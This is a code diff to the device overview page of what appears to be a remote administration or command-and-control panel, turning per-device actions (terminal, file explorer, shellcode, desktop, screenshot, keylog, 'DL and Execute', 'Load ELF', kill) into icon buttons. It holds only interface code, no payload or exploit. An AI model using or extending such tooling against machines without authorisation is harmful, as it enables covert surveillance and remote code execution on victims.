@@ -268,21 +268,35 @@ function overview(props) {
 
 	function renderOperation(device) {
 		let menus = [
-			{key: 'execute', name: i18n.t('OVERVIEW.EXECUTE')},
-			{key: 'executable', name: "DL and Execute"},
+			{ key: 'executable', name: "DL and Execute"},
 			{key: 'loadelf', name: "Load ELF"},
-			{key: 'shellcode', name: i18n.t('OVERVIEW.SHELLCODE')},
-			{key: 'desktop', name: i18n.t('OVERVIEW.DESKTOP')},
-			{key: 'keylog', name: "Keylog"},
-			{key: 'screenshot', name: i18n.t('OVERVIEW.SCREENSHOT')},
+			{ key: 'keylog', name: 'Keylog'},
 			{key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
-			{key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN')},
-			{key: 'KILL', name: 'KILL'},
+			{ key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN') },
+			{ key: 'KILL', name: <i class="fa-solid fa-skull-crossbones"></i>},
 		];
 		return [
-			<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{i18n.t('OVERVIEW.TERMINAL')}</a>,
-			<a key='explorer' onClick={() => onMenuClick('explorer', device)}>{i18n.t('OVERVIEW.EXPLORER')}</a>,
-			<a key='procmgr' onClick={() => onMenuClick('procmgr', device)}>{i18n.t('OVERVIEW.PROC_MANAGER')}</a>,
+			<Tooltip key="terminal-tooltip" title={i18n.t('OVERVIEW.TERMINAL') || "Terminal"}>
+				<a key='terminal' onClick={() => onMenuClick('terminal', device)}>{<i className="fa-solid fa-terminal"></i>}</a>
+			</Tooltip>,
+			<Tooltip key="explorer-tooltip" title={i18n.t('OVERVIEW.EXPLORER') || "File Explorer"}>
+				<a key='explorer' onClick={() => onMenuClick('explorer', device)}>{<i className="fa-regular fa-folder-open"></i>}</a>
+			</Tooltip>,
+			<Tooltip key="procmgr-tooltip" title={i18n.t('OVERVIEW.PROC_MANAGER') || "Process Manager"}>
+				<a key='procmgr' onClick={() => onMenuClick('procmgr', device)}>{<i className="fa-solid fa-gear"></i>}</a>
+			</Tooltip>,
+			<Tooltip key="execute-tooltip" title={i18n.t('OVERVIEW.EXECUTE') || "Execute"}>
+				<a key='execute' onClick={() => onMenuClick('execute', device)}>{<i class="fa-regular fa-circle-play"></i>}</a>
+			</Tooltip>,
+			<Tooltip key="shellcode-tooltip" title={i18n.t('OVERVIEW.SHELLCODE') || "Shellcode"}>
+				<a key='shellcode' onClick={() => onMenuClick('shellcode', device)}>{<i class="fa-regular fa-file-code"></i>}</a>
+			</Tooltip>,
+			<Tooltip key="desktop-tooltip" title={i18n.t('OVERVIEW.DESKTOP') || "Desktop"}>
+				<a key='desktop' onClick={() => onMenuClick('desktop', device)}>{<i class="fa-solid fa-display"></i>}</a>
+			</Tooltip>,
+			<Tooltip key="screenshot-tooltip" title={i18n.t('OVERVIEW.SCREENSHOT') || "Screenshot"}>
+				<a key='screenshot' onClick={() => onMenuClick('screenshot', device)}>{<i class="fa-regular fa-image"></i>}</a>
+			</Tooltip>,
 			<TableDropdown
 				key='more'
 				onSelect={key => onMenuClick(key, device)}
@@ -501,7 +515,6 @@ function overview(props) {
 					x: 'max-content',
 					scrollToFirstRowOnChange: true
 				}}
-
 				rowKey='id'
 				search={false}
 				options={options}
